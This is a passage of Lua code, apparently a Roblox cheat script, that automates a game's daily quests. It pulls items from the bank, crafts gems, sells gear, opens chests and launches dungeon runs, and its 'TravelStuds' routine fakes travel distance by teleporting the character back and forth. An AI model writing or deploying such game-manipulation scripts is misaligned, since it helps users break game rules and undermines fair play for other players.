    -- ==========================================
    local function IsRawGemFragment(ID, Data)
        if type(Data) ~= "table" then return false end
        local Cat = string.lower(tostring(Data.Category or ""))
        if Cat == "refined gem" then return false end
        local LowId = string.lower(tostring(ID or ""))
        local LowDisp = string.lower(tostring(Data.DisplayName or ""))
        return (Cat == "gem" or Cat == "gemstone" or string.find(Cat, "gem", 1, true) or string.find(LowId, "gem", 1, true) or string.find(LowDisp, "fragment", 1, true))
    end

    local function IsRedFragment(ID, Data)
        if not IsRawGemFragment(ID, Data) then return false end
        local Combined = string.lower(tostring(ID or "") .. " " .. tostring(Data.DisplayName or ""))
        return (string.find(Combined, "red", 1, true) ~= nil) or (string.find(Combined, "ruby", 1, true) ~= nil)
    end

    local function IsGreenFragment(ID, Data)
        if not IsRawGemFragment(ID, Data) then return false end
        local Combined = string.lower(tostring(ID or "") .. " " .. tostring(Data.DisplayName or ""))
        return (string.find(Combined, "green", 1, true) ~= nil) or (string.find(Combined, "emerald", 1, true) ~= nil)
    end

    local function CollectInventoryMatching(MatcherFn)
        local Profile = GetProfile()
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        local Out, TotalUnits = {}, 0
        if not Inv then return Out, 0 end

        for _, Item in ipairs(Inv:GetChildren()) do
            if not IsItemFavoritedOrLocked(Item) then
                local ID, Data = GetItemIdAndData(Item)
                if ID and Data and MatcherFn(Item, ID, Data) then
                    local Cnt = GetItemCount(Item)
                    TotalUnits = TotalUnits + Cnt
                    table.insert(Out, {Item = Item, Rarity = GetSafeRarity(Item), Level = GetSafeLevel(Item), Count = Cnt})
                end
            end
        end

        table.sort(Out, function(a, b)
            if a.Rarity ~= b.Rarity then return a.Rarity < b.Rarity end
            return a.Level < b.Level
        end)
        return Out, TotalUnits
    end

    -- ==========================================
    -- LOBBY QUEST HANDLERS (AUTO-PULL FROM BANK INCLUDED!)
    -- ==========================================
    local Handlers = {}

    -- 1. EatFood (Auto-Pulls Exact Missing Count of Lowest-Rarity Food from Bank!)
    Handlers.EatFood = function(Q)
        return WithBankPaused(function()
            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local function FoodMatcher(_, _, Data)
                return Data.Category == "Food" or Data.Type == "Food"
            end

            local Foods, HaveUnits = CollectInventoryMatching(FoodMatcher)
            if HaveUnits < Need then
                SetStatus("Pulling " .. tostring(Need - HaveUnits) .. " low-rarity Food from Bank...")
                PullLowestRarityFromBank(Need - HaveUnits, FoodMatcher)
                Foods, HaveUnits = CollectInventoryMatching(FoodMatcher)
            end
            if HaveUnits == 0 then return false end

            local EquipFoodRemote = Remotes:FindFirstChild("EquipFood")
            local Worked = false

            for _ = 1, Need do
                if not Cfg.MasterEnabled and not State.ManualOnce then break end
                if (tonumber(Q.ValObj.Value) or 0) >= Q.Goal then break end

                Foods = CollectInventoryMatching(FoodMatcher)
                local Target = Foods[1] and Foods[1].Item
                if not Target then break end

                local Before = tonumber(Q.ValObj.Value) or 0
                if Sys.Equipment and type(Sys.Equipment.EquipFood) == "function" then
                    pcall(function() Sys.Equipment:EquipFood(Player, Target) end)
                elseif EquipFoodRemote then
                    pcall(function() EquipFoodRemote:FireServer(Sys.Items:ItemRefForRemote(Target)) end)
                end

                if WaitQuestAdvance(Q.ValObj, Before, 1.2) then
                    Worked = true
                else
                    break
                end
                task.wait(0.12)
            end
            return Worked
        end)
    end

    -- 2. CraftGem (Precious Ruby Recipe: Red - Green - Red - Red | Auto-Pulls 3x Red + 1x Green per Gem!)
    Handlers.CraftGem = function(Q)
        if not Sys.Gemstones then return false end
        return WithBankPaused(function()
            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local NeedRed = Need * 3
            local NeedGreen = Need * 1

            local function RedMatch(_, id, data) return IsRedFragment(id, data) end
            local function GreenMatch(_, id, data) return IsGreenFragment(id, data) end

            local Reds, HaveRed = CollectInventoryMatching(RedMatch)
            local Greens, HaveGreen = CollectInventoryMatching(GreenMatch)

            if HaveRed < NeedRed then
                SetStatus("Pulling " .. tostring(NeedRed - HaveRed) .. " Red Fragments from Bank...")
                PullLowestRarityFromBank(NeedRed - HaveRed, RedMatch)
            end
            if HaveGreen < NeedGreen then
                SetStatus("Pulling " .. tostring(NeedGreen - HaveGreen) .. " Green Fragments from Bank...")
                PullLowestRarityFromBank(NeedGreen - HaveGreen, GreenMatch)
            end

            local Worked = false
            for _ = 1, Need do
                if not Cfg.MasterEnabled and not State.ManualOnce then break end
                if (tonumber(Q.ValObj.Value) or 0) >= Q.Goal then break end

                Reds, HaveRed = CollectInventoryMatching(RedMatch)
                Greens, HaveGreen = CollectInventoryMatching(GreenMatch)
                if HaveRed < 3 or HaveGreen < 1 then break end

                -- Build 3 Red refs (handles both stacked Count>=3 and 3 separate Count=1 instances!)
                local RedRefs = {}
                for _, entry in ipairs(Reds) do
                    for _ = 1, entry.Count do
                        table.insert(RedRefs, entry.Item)
                        if #RedRefs == 3 then break end
                    end
                    if #RedRefs == 3 then break end
                end

                local GreenRef = Greens[1] and Greens[1].Item
                if #RedRefs < 3 or not GreenRef then break end

                -- Exact Precious Ruby order: Red -> Green -> Red -> Red
                local Batch = {RedRefs[1], GreenRef, RedRefs[2], RedRefs[3]}
                local Before = tonumber(Q.ValObj.Value) or 0
                pcall(function() Sys.Gemstones:CraftGem(Player, Batch, 1) end)

                if WaitQuestAdvance(Q.ValObj, Before, 1.5) then
                    Worked = true
                else
                    break
                end
                task.wait(0.15)
            end

            -- Fallback: if still incomplete, try 4x Refined Gem merge
            if (tonumber(Q.ValObj.Value) or 0) < Q.Goal then
                if Handlers.UpgradeGem(Q) then Worked = true end
            end
            return Worked
        end)
    end

    -- 3. UpgradeGem (4x Same Refined Gem Merge — Auto-Pulls lowest rarity from Bank if needed!)
    Handlers.UpgradeGem = function(Q)
        if not Sys.Gemstones then return false end
        return WithBankPaused(function()
            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local function RefGemMatch(_, _, Data) return Data.Category == "Refined Gem" end

            local RefGems, HaveCount = CollectInventoryMatching(RefGemMatch)
            if HaveCount < Need * 4 then
                PullLowestRarityFromBank((Need * 4) - HaveCount, RefGemMatch)
                RefGems = CollectInventoryMatching(RefGemMatch)
            end

            local Groups = {}
            for _, Entry in ipairs(RefGems) do
                if Entry.Rarity <= math.max(Cfg.MaxSafeTrashRarity, 4) then
                    local ID = GetItemIdAndData(Entry.Item)
                    local Key = tostring(ID) .. "|" .. tostring(Entry.Rarity)
                    Groups[Key] = Groups[Key] or {}
                    table.insert(Groups[Key], Entry.Item)
                end
            end

            local Worked = false
            for _, Group in pairs(Groups) do
                while #Group >= 4 and (tonumber(Q.ValObj.Value) or 0) < Q.Goal do
                    local Batch = {table.remove(Group, 1), table.remove(Group, 1), table.remove(Group, 1), table.remove(Group, 1)}
                    local Before = tonumber(Q.ValObj.Value) or 0
                    pcall(function() Sys.Gemstones:CraftGem(Player, Batch, 1) end)
                    if WaitQuestAdvance(Q.ValObj, Before, 1.5) then
                        Worked = true
                    else
                        return Worked
                    end
                    task.wait(0.15)
                end
            end
            return Worked
        end)
    end

    -- 4. UsePotion
    Handlers.UsePotion = function(Q)
        local PotRemote = Remotes:FindFirstChild("UsePotion")
        if not PotRemote then return false end
        local Before = tonumber(Q.ValObj.Value) or 0
        pcall(function() PotRemote:FireServer() end)
        return WaitQuestAdvance(Q.ValObj, Before, 1.3)
    end

    -- 5. EquipNecklace (Swaps & Restores Original Necklace!)
    Handlers.EquipNecklace = function(Q)
        return WithBankPaused(function()
            local Profile = GetProfile()
            local Equipped = Profile and Profile:FindFirstChild("Equipped")
            local OrigNecklace = Equipped and Equipped:FindFirstChild("Necklace") and Equipped.Necklace:GetChildren()[1]

            local function NeckMatch(_, _, Data) return Data.Category == "Necklace" end
            local Necks = CollectInventoryMatching(NeckMatch)
            if #Necks == 0 then
                PullLowestRarityFromBank(1, NeckMatch)
                Necks = CollectInventoryMatching(NeckMatch)
            end
            local Picked = Necks[1] and Necks[1].Item
            if not Picked then return false end

            local EquipNeckRemote = Remotes:FindFirstChild("EquipNecklace")
            local function DoEquip(ItemObj)
                if Sys.Equipment and type(Sys.Equipment.EquipNecklace) == "function" then
                    pcall(function() Sys.Equipment:EquipNecklace(Player, ItemObj) end)
                elseif EquipNeckRemote then
                    pcall(function() EquipNeckRemote:FireServer(Sys.Items:ItemRefForRemote(ItemObj)) end)
                end
            end

            local Before = tonumber(Q.ValObj.Value) or 0
            DoEquip(Picked)
            local ok = WaitQuestAdvance(Q.ValObj, Before, 1.4)
            if OrigNecklace and OrigNecklace.Parent then
                task.wait(0.2)
                DoEquip(OrigNecklace)
            end
            return ok
        end)
    end

    -- 6. EquipCosmetic
    Handlers.EquipCosmetic = function(Q)
        local okC, CosTbl = pcall(function() return Sys.Items:GetTableItems(Player, "Cosmetics") end)
        if not okC or type(CosTbl) ~= "table" then return false end
        for _, Item in pairs(CosTbl) do
            local _, Data = GetItemIdAndData(Item)
            if Data and (Data.Type == "ShirtCosmetic" or Data.Type == "PantsCosmetic") then
                local Before = tonumber(Q.ValObj.Value) or 0
                local CosRemote = Remotes:FindFirstChild("EquipCosmetic")
                if Sys.Equipment and type(Sys.Equipment.EquipCosmetic) == "function" then
                    pcall(function() Sys.Equipment:EquipCosmetic(Player, Item, Data.Type) end)
                elseif CosRemote then
                    pcall(function() CosRemote:FireServer(Sys.Items:ItemRefForRemote(Item), Data.Type) end)
                end
                return WaitQuestAdvance(Q.ValObj, Before, 1.5)
            end
        end
        return false
    end

    -- 7. SellItem (Low-Rarity Trash Only, Pulls Exact Count from Bank if needed!)
    Handlers.SellItem = function(Q)
        if not Sys.ItemSelling then return false end
        return WithBankPaused(function()
            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local function TrashMatch(Item, _, Data)
                return (Data.Category == "Weapon" or Data.Category == "Armor") and not IsProtectedGear(Item)
            end

            local TrashList = CollectInventoryMatching(TrashMatch)
            if #TrashList < Need then
                PullLowestRarityFromBank(Need - #TrashList, TrashMatch)
                TrashList = CollectInventoryMatching(TrashMatch)
            end
            if #TrashList == 0 then return false end

            local ToSell = {}
            for i = 1, math.min(Need, #TrashList) do
                table.insert(ToSell, TrashList[i].Item)
            end

            local Before = tonumber(Q.ValObj.Value) or 0
            pcall(function() Sys.ItemSelling:SellItem(Player, ToSell, {}) end)
            return WaitQuestAdvance(Q.ValObj, Before, 1.6)
        end)
    end

    -- 8. RerollStats (Trash Gear + Always KeepStats!)
    Handlers.RerollStats = function(Q)
        if not Sys.StatRerolling then return false end
        return WithBankPaused(function()
            local function TrashMatch(Item, _, Data)
                return (Data.Category == "Weapon" or Data.Category == "Armor") and not IsProtectedGear(Item)
            end

            local TrashList = CollectInventoryMatching(TrashMatch)
            if #TrashList == 0 then
                PullLowestRarityFromBank(1, TrashMatch)
                TrashList = CollectInventoryMatching(TrashMatch)
            end
            local Trash = TrashList[1] and TrashList[1].Item
            if not Trash then return false end

            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local Worked = false

            for _ = 1, Need do
                if not Cfg.MasterEnabled and not State.ManualOnce then break end
                local Before = tonumber(Q.ValObj.Value) or 0
                local okR, res = pcall(function() return Sys.StatRerolling:GetNewStats(Player, Trash, {}) end)
                task.wait(0.12)
                pcall(function() Sys.StatRerolling:KeepStats(Player) end)
                if okR and res and WaitQuestAdvance(Q.ValObj, Before, 1.4) then
                    Worked = true
                else
                    break
                end
                task.wait(0.15)
            end
            return Worked
        end)
    end

    -- 9. InfuseGem (Trash Gear + Lowest-Rarity Refined Gem)
    Handlers.InfuseGem = function(Q)
        if not Sys.Gemstones then return false end
        return WithBankPaused(function()
            local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            local function GearMatch(Item, _, Data)
                return (Data.Category == "Weapon" or Data.Category == "Armor") and not IsProtectedGear(Item)
            end
            local function GemMatch(Item, _, Data)
                return Data.Category == "Refined Gem" and GetSafeRarity(Item) <= 2
            end

            local Gears = CollectInventoryMatching(GearMatch)
            local Gems = CollectInventoryMatching(GemMatch)
            if #Gears < Need then PullLowestRarityFromBank(Need - #Gears, GearMatch) end
            if #Gems < Need then PullLowestRarityFromBank(Need - #Gems, GemMatch) end

            local Worked = false
            for _ = 1, Need do
                if not Cfg.MasterEnabled and not State.ManualOnce then break end
                Gears = CollectInventoryMatching(GearMatch)
                Gems = CollectInventoryMatching(GemMatch)
                if not (Gears[1] and Gems[1]) then break end

                local Before = tonumber(Q.ValObj.Value) or 0
                pcall(function() Sys.Gemstones:EquipGem(Player, Gears[1].Item, Gems[1].Item) end)
                if WaitQuestAdvance(Q.ValObj, Before, 1.5) then Worked = true else break end
                task.wait(0.18)
            end
            return Worked
        end)
    end

    -- 10 & 11. OpenChest & SpendKeys
    Handlers.OpenChest = function(Q)
        if not Sys.ChestShop then return false end
        local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
        local Worked = false

        local function SkillChestMatch(_, id, Data)
            return Data.Category == "Chest" and string.find(tostring(id), "Skill", 1, true) ~= nil
        end

        local Chests = CollectInventoryMatching(SkillChestMatch)
        for _, Entry in ipairs(Chests) do
            if Need <= 0 then break end
            local ID = GetItemIdAndData(Entry.Item)
            local OpenAmt = math.min(Need, Entry.Count)
            local Before = tonumber(Q.ValObj.Value) or 0
            pcall(function() Sys.ChestShop:OpenChest(Player, ID, OpenAmt, {Entry.Item}) end)
            if WaitQuestAdvance(Q.ValObj, Before, 1.8) then
                Worked = true
                Need = math.max(0, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
            end
            task.wait(0.2)
        end

        if Need > 0 and Cfg.AllowSpendKeys then
            local Before = tonumber(Q.ValObj.Value) or 0
            pcall(function() Sys.ChestShop:OpenChest(Player, "SkillChest", Need) end)
            if WaitQuestAdvance(Q.ValObj, Before, 1.8) then Worked = true end
        end
        return Worked
    end

    Handlers.SpendKeys = function(Q)
        if not Cfg.AllowSpendKeys or not Sys.ChestShop then return false end
        local Profile = GetProfile()
        local KeysObj = Profile and Profile:FindFirstChild("Currencies") and Profile.Currencies:FindFirstChild("Keys")
        if (KeysObj and tonumber(KeysObj.Value) or 0) < 50 then return false end

        local Worked = false
        for _ = 1, 15 do
            if not Cfg.MasterEnabled and not State.ManualOnce then break end
            if (tonumber(Q.ValObj.Value) or 0) >= Q.Goal then break end
            local Before = tonumber(Q.ValObj.Value) or 0
            pcall(function() Sys.ChestShop:OpenChest(Player, "SkillChest", 1) end)
            if WaitQuestAdvance(Q.ValObj, Before, 1.6) then Worked = true else break end
            task.wait(0.18)
        end
        return Worked
    end

    -- 12, 13 & 14. LevelPet, SpendMagicDust & UpgradePet
    local function FindCheapestPet()
        local Profile = GetProfile()
        local PetsFolder = Profile and Profile:FindFirstChild("Pets")
        if not PetsFolder then return nil end
        local BestPet, LowestLvl = nil, math.huge
        for _, Pet in ipairs(PetsFolder:GetChildren()) do
            local _, Data = GetItemIdAndData(Pet)
            if Data and Data.Category == "Pet" and not IsItemFavoritedOrLocked(Pet) then
                local Lvl = GetSafeLevel(Pet)
                if Lvl < 200 and Lvl < LowestLvl then BestPet = Pet; LowestLvl = Lvl end
            end
        end
        return BestPet
    end

    Handlers.LevelPet = function(Q)
        if not Cfg.AllowSpendDust or not Sys.Pets then return false end
        local Pet = FindCheapestPet()
        if not Pet then return false end
        local Need = math.max(1, Q.Goal - (tonumber(Q.ValObj.Value) or 0))
        local Before = tonumber(Q.ValObj.Value) or 0
        pcall(function() Sys.Pets:LevelUpPet(Player, Pet, Need, false) end)
        return WaitQuestAdvance(Q.ValObj, Before, 1.6)
    end

    Handlers.SpendMagicDust = function(Q)
        if not Cfg.AllowSpendDust or not Sys.Pets then return false end
        local Pet = FindCheapestPet()
        if not Pet then return false end
        local Worked = false
        for _ = 1, 10 do
            if not Cfg.MasterEnabled and not State.ManualOnce then break end
            if (tonumber(Q.ValObj.Value) or 0) >= Q.Goal then break end
            local Before = tonumber(Q.ValObj.Value) or 0
            pcall(function() Sys.Pets:LevelUpPet(Player, Pet, 1, false) end)
            if WaitQuestAdvance(Q.ValObj, Before, 1.5) then Worked = true else break end
            task.wait(0.15)
        end
        return Worked
    end

    Handlers.UpgradePet = function(Q)
        local Profile = GetProfile()
        local PetsFolder = Profile and Profile:FindFirstChild("Pets")
        if not PetsFolder or not Sys.Pets then return false end

        local TokenCounts = {}
        for _, c in ipairs(PetsFolder:GetChildren()) do
            local id, Data = GetItemIdAndData(c)
            if Data and Data.Category == "Pet Token" then
                TokenCounts[id] = (TokenCounts[id] or 0) + GetItemCount(c)
            end
        end

        for _, Pet in ipairs(PetsFolder:GetChildren()) do
            local id, Data = GetItemIdAndData(Pet)
            if Data and Data.Category == "Pet" and GetSafeRarity(Pet) < 6 then
                local okReq, req = pcall(function() return Sys.Pets:GetPetTokensRequiredForUpgrade(Pet) end)
                local Have = TokenCounts[tostring(id) .. "Token"] or TokenCounts[id] or 0
                if okReq and tonumber(req) and Have >= tonumber(req) then
                    local Before = tonumber(Q.ValObj.Value) or 0
                    pcall(function() Sys.Pets:UpgradePet(Player, Pet) end)
                    if WaitQuestAdvance(Q.ValObj, Before, 1.6) then return true end
                end
            end
        end
        return false
    end

    -- 15. TravelStuds (Fast Safe 115-Stud Oscillation)
    Handlers.TravelStuds = function(Q)
        if not Cfg.DoTravelStuds then return false end
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if not HRP then return false end

        local OriginCF = HRP.CFrame
        local PosA = OriginCF * CFrame.new(0, 6, 0)
        local PosB = OriginCF * CFrame.new(115, 6, 0)
        local Side, Stalled, Worked = false, 0, false

        SetStatus("Auto-Traveling: " .. Q.Title)
        while (Cfg.MasterEnabled or State.ManualOnce) and HRP and HRP.Parent do
            local Cur = tonumber(Q.ValObj.Value) or 0
            if Cur >= Q.Goal then Worked = true; break end
            Side = not Side
            HRP.AssemblyLinearVelocity = Vector3.zero
            HRP.CFrame = Side and PosB or PosA
            task.wait(0.40)
            if (tonumber(Q.ValObj.Value) or 0) > Cur then
                Worked = true; Stalled = 0
            else
                Stalled = Stalled + 1
                if Stalled >= 8 then break end
            end
        end
        if HRP and HRP.Parent then HRP.AssemblyLinearVelocity = Vector3.zero; HRP.CFrame = OriginCF end
        return Worked
    end

    -- ==========================================
    -- DYNAMIC LAST STORY DUNGEON & MARTHUUN RAID DETECTOR
    -- ==========================================
    local function DetectLastStoryDungeonAndFirstRaid()
        local LastStoryId, HighestStoryLvl = nil, -1
        local FirstRaidId, LowestRaidLvl = nil, math.huge
        local MarthuunRaidId = nil

        local DungTable = nil
        if Sys.Dungeons then
            local okL, list = pcall(function()
                return (Sys.Dungeons.GetDungeonList and Sys.Dungeons:GetDungeonList())
                    or (Sys.Dungeons.GetDungeons and Sys.Dungeons:GetDungeons())
                    or Sys.Dungeons.Dungeons
                    or Sys.Dungeons.List
            end)
            if okL and type(list) == "table" then DungTable = list end
        end

        if type(DungTable) == "table" then
            for Key, Info in pairs(DungTable) do
                if type(Info) == "table" then
                    local DId = tostring(Info.Id or Info.Name or Key)
                    local Disp = string.lower(tostring(Info.DisplayName or Info.Name or DId))
                    local DType = string.lower(tostring(Info.Type or Info.DungeonType or ""))
                    local Lvl = tonumber(Info.LevelRequirement or Info.MinLevel or Info.Level or 0) or 0

                    -- Match Marthuun / First Raid
                    local IsRaid = (DType == "raid") or (Info.IsRaid == true) or (string.find(string.lower(DId), "raid", 1, true) ~= nil)
                    if IsRaid then
                        if string.find(Disp, "marth", 1, true) or string.find(string.lower(DId), "marth", 1, true) then
                            MarthuunRaidId = DId
                        end
                        if Lvl < LowestRaidLvl then
                            LowestRaidLvl = Lvl
                            FirstRaidId = DId
                        end
                    elseif DType ~= "event" and DType ~= "gauntlet" and DType ~= "daily"
                        and not string.find(string.lower(DId), "event", 1, true)
                        and not string.find(string.lower(DId), "daily", 1, true)
                        and not string.find(string.lower(DId), "gauntlet", 1, true) then
                        if Lvl > HighestStoryLvl then
                            HighestStoryLvl = Lvl
                            LastStoryId = DId
                        end
                    end
                end
            end
        end

        -- Fallback scan via QueueRings if Dungeons table didn't expose story list
        if not LastStoryId and workspace:FindFirstChild("QueueRings") then
            for _, Ring in ipairs(workspace.QueueRings:GetChildren()) do
                local n = Ring.Name
                if string.find(n, "Dungeon", 1, true) and not string.find(n, "Event", 1, true) and not string.find(n, "Daily", 1, true) then
                    LastStoryId = n
                end
            end
        end

        return LastStoryId or "FrostDungeon", MarthuunRaidId or FirstRaidId or "MarthunRaid"
    end

    local function PickBestDungeonQuest(DailyQuests)
        local LastStoryDungeon, MarthuunRaid = DetectLastStoryDungeonAndFirstRaid()
        local NIGHTMARE = 6

        -- 1. Specific Story Dungeon Quest (e.g. CathedralDungeon) -> Nightmare (6)
        for _, Q in ipairs(DailyQuests) do
            if not Q.Completed then
                if Q.RolledStoryDungeon and #tostring(Q.RolledStoryDungeon) > 0 then
                    return Q, tostring(Q.RolledStoryDungeon), math.max(NIGHTMARE, Q.MinDifficulty or 1), false
                end
                if Q.TargetDungeon and #tostring(Q.TargetDungeon) > 0 then
                    return Q, tostring(Q.TargetDungeon), NIGHTMARE, true
                end
            end
        end

        -- 2. Daily Challenge Boss -> Nightmare (6)
        for _, Q in ipairs(DailyQuests) do
            if not Q.Completed and Q.Objective == "ClearDailyChallenge" then
                return Q, "DailyBossDungeon", NIGHTMARE, false
            end
        end

        -- 3. KillMob / NoHit / Speedrun / DealDamage / Any Clear -> LAST STORY DUNGEON (Nightmare 6)!
        for _, Q in ipairs(DailyQuests) do
            if not Q.Completed then
                local Obj = Q.Objective
                if Obj == "KillMob" or Obj == "NoHitBossClear" or Obj == "ClearDungeonInMinutes"
                    or Obj == "DealDamage" or Obj == "HealDamage"
                    or (Obj == "ClearDungeon" and Q.DungeonType ~= "Raid" and Q.DungeonType ~= "Event") then
                    local MultiRun = (Obj == "KillMob") or (Q.Goal > 1)
                    return Q, LastStoryDungeon, NIGHTMARE, MultiRun
                end
            end
        end

        -- 4. Raid Quest -> MARTHUUN (1st Raid) on Nightmare (6)!
        if Cfg.AllowRaidQueue then
            for _, Q in ipairs(DailyQuests) do
                if not Q.Completed and Q.DungeonType == "Raid" then
                    return Q, MarthuunRaid, NIGHTMARE, (Q.Goal > 1)
                end
            end
        end

        -- 5. Event Dungeon -> Nightmare (6)
        if Cfg.AllowEventQueue then
            for _, Q in ipairs(DailyQuests) do
                if not Q.Completed and Q.DungeonType == "Event" then
                    return Q, "EventDungeon", NIGHTMARE, (Q.Goal > 1)
                end
            end
        end

        return nil, nil, nil, false
    end

    local function LaunchDungeonRun(QuestObj, DungeonId, Difficulty, NeedMultiRun)
        if os.clock() - State.LastQueueAttempt < 7 then return false end
        State.LastQueueAttempt = os.clock()

        -- Auto-Enable Pet Aura, Auto Mobs, Auto Claim All, Auto Start & Auto Play Again BEFORE teleporting!
        ActivateQuestCombatFlags(QuestObj.Id, NeedMultiRun)

        SetStatus(string.format("Launching %s (Nightmare %d)...", DungeonId, Difficulty))
        ShowQuestNotify(
            "Auto Launching: " .. tostring(DungeonId),
            "Nightmare | Pet Aura, Auto Mobs & Claim All ON",
            Color3.fromRGB(0, 210, 255),
            3.0
        )

        if Sys.Parties and type(Sys.Parties.CreateParty) == "function" then
            pcall(function()
                Sys.Parties:CreateParty(Player, DungeonId, Difficulty, 1, true, false, {}, true)
            end)
            task.wait(0.6)
            local LaunchRemote = Remotes:FindFirstChild("LaunchParty")
            if LaunchRemote then
                pcall(function() LaunchRemote:FireServer() end)
            elseif type(Sys.Parties.LaunchParty) == "function" then
                pcall(function() Sys.Parties:LaunchParty(Player) end)
            end
            return true
        end

        if Sys.QueueRings and type(Sys.QueueRings.TeleportToRing) == "function" then
            pcall(function() Sys.QueueRings:TeleportToRing(Player, DungeonId) end)
            return true
        end
        return false
    end

    -- ==========================================
    -- MASTER EXECUTION LOOP (FAST 0.5s TICK)
    -- ==========================================
    local function RunLobbyQuestsPass(IsManualOnce)
        if State.Busy then return end
        State.Busy = true
        State.ManualOnce = IsManualOnce == true

        pcall(function()
            RunAutoClaims(true)

            local DailyQuests = ReadQuests("Daily")
            local Now = os.clock()

            -- 1. Instant Lobby Quests (Auto-Pulls Missing Food / Gem Fragments / Trash from Bank!)
            if Cfg.DoLobbyQuests then
                for _, Q in ipairs(DailyQuests) do
                    if not Cfg.MasterEnabled and not State.ManualOnce then break end
                    if not Q.Completed then
                        local CooldownUntil = State.FailedCooldown[Q.Id] or 0
                        local Handler = Handlers[Q.Objective]
                        if Handler and Q.Objective ~= "TravelStuds" and Now >= CooldownUntil then
                            SetStatus("Doing: " .. Q.Title .. " (" .. Q.Progress .. "/" .. Q.Goal .. ")")
                            local ok = Handler(Q)
                            if not ok then
                                State.FailedCooldown[Q.Id] = os.clock() + 30
                            else
                                RunAutoClaims(true)
                            end
                            task.wait(0.18)
                        end
                    end
                end
            end

            -- 2. TravelStuds
            if Cfg.DoTravelStuds and (Cfg.MasterEnabled or State.ManualOnce) then
                local AllQ = ReadQuests(Cfg.IncludeWeeklyClaim and nil or "Daily")
                for _, Q in ipairs(AllQ) do
                    if not Cfg.MasterEnabled and not State.ManualOnce then break end
                    if not Q.Completed and Q.Objective == "TravelStuds" and os.clock() >= (State.FailedCooldown[Q.Id] or 0) then
                        local ok = Handlers.TravelStuds(Q)
                        if not ok then State.FailedCooldown[Q.Id] = os.clock() + 45 else RunAutoClaims(true) end
                    end
                end
            end

            RunAutoClaims(true)

            -- 3. Queue Dungeon/Raid OR Auto-Disable Combat Flags when done!
            local FreshDaily, FreshComp = ReadQuests("Daily")
            if not IsManualOnce and Cfg.MasterEnabled and Cfg.DoDungeonQueue and IsInLobby() then
                if FreshComp >= Cfg.TargetDailyGoal then
                    DeactivateQuestCombatFlags(false)
                    SetStatus(string.format("Daily Goal Complete! (%d/12) | Combat Flags OFF", FreshComp))
                else
                    local TargetQ, DungId, Diff, MultiRun = PickBestDungeonQuest(FreshDaily)
                    if TargetQ and DungId then
                        LaunchDungeonRun(TargetQ, DungId, Diff, MultiRun)
                    else
                        DeactivateQuestCombatFlags(false)
                        SetStatus(string.format("Done (%d/12) | Remaining need Co-op | Combat OFF", FreshComp))
                    end
                end
            else
                if IsInLobby() and FreshComp >= Cfg.TargetDailyGoal then
                    DeactivateQuestCombatFlags(false)
                end
                SetStatus(string.format("Ready | Daily Progress: %d/12", FreshComp))
            end
        end)

        State.ManualOnce = false
        State.Busy = false
    end

    -- In-Dungeon Monitor: Turns OFF AutoPlayAgain & returns to Lobby as soon as quest completes!
    local function RunInDungeonMonitor()
        local Marker = ReadCombatMarker()
        if not Marker or not Marker.active then return end

        local DailyQuests, DailyComp = ReadQuests("Daily")
        local TrackedFinished = true
        for _, Q in ipairs(DailyQuests) do
            if Q.Id == Marker.questId and not Q.Completed then
                TrackedFinished = false
                break
            end
        end

        if TrackedFinished or DailyComp >= Cfg.TargetDailyGoal then
            SetUIFlag("AutoPlayAgainToggle", false)
            RunAutoClaims(true)

            local ClearedGui = Player:FindFirstChild("PlayerGui") and Player.PlayerGui:FindFirstChild("DungeonCleared")
            if ClearedGui and ClearedGui.Enabled then
                if DailyComp >= Cfg.TargetDailyGoal then
                    DeactivateQuestCombatFlags(true)
                end
                task.wait(0.8)
                local ExitChoice = Remotes:FindFirstChild("SetExitChoice")
                if ExitChoice then pcall(function() ExitChoice:FireServer("Lobby") end) end
            end
        end
    end

    -- ==========================================
    -- UI CONTROLS (ALL WITH UNIQUE FLAGS)
    -- ==========================================
    State.StatusLabel = TargetTab:CreateLabel("Status: Fast Engine Ready")

    TargetTab:CreateToggle({
        Name = "Auto Complete Daily Quests (Master Switch)",
        CurrentValue = false,
        Flag = "DH_AutoDailyMaster",
        Callback = function(Val)
            Cfg.MasterEnabled = (Val == true)
            if Val then
                table.clear(State.FailedCooldown)
                SetStatus("Active — Instant Scan Running...")
            else
                DeactivateQuestCombatFlags(false)
                SetStatus("Paused | Auto Combat Flags Restored OFF")
            end
        end
    })

    TargetTab:CreateToggle({
        Name = "Instant Auto-Claim (Quests, Milestones 2-10 & Calendar)",
        CurrentValue = true,
        Flag = "DH_AutoDailyClaim",
        Callback = function(Val) Cfg.AutoClaimEnabled = (Val == true) end
    })

    TargetTab:CreateButton({
        Name = "Scan Today's 12 Daily Quests (Instant)",
        Callback = function()
            local DailyQ, DailyComp = ReadQuests("Daily")
            local LobbyLeft, DungLeft, CoopLeft = 0, 0, 0
            local NextTitle = "All Daily Quests Completed!"
            local LastDung, FirstRaid = DetectLastStoryDungeonAndFirstRaid()

            for _, Q in ipairs(DailyQ) do
                if not Q.Completed then
                    if NextTitle == "All Daily Quests Completed!" then
                        NextTitle = Q.Title .. " (" .. Q.Progress .. "/" .. Q.Goal .. ")"
                    end
                    if Handlers[Q.Objective] then LobbyLeft = LobbyLeft + 1
                    elseif Q.Objective == "ClearDungeonWithOtherPlayer" or Q.Objective == "PerfectDodge" then CoopLeft = CoopLeft + 1
                    else DungLeft = DungLeft + 1 end
                end
            end

            ShowQuestNotify(
                string.format("Daily: %d/12 | Lobby:%d Dung:%d Co-op:%d", DailyComp, LobbyLeft, DungLeft, CoopLeft),
                string.format("Next: %s | Last:%s | Raid:%s", NextTitle, LastDung, FirstRaid),
                (LobbyLeft + DungLeft == 0) and Color3.fromRGB(0, 235, 160) or Color3.fromRGB(0, 210, 255),
                4.0
            )
            SetStatus(string.format("%d/12 | Next: %s", DailyComp, NextTitle))
        end
    })

    TargetTab:CreateButton({
        Name = "Run Lobby Quests (Auto-Pull Bank + Claim) Now",
        Callback = function()
            task.spawn(function()
                table.clear(State.FailedCooldown)
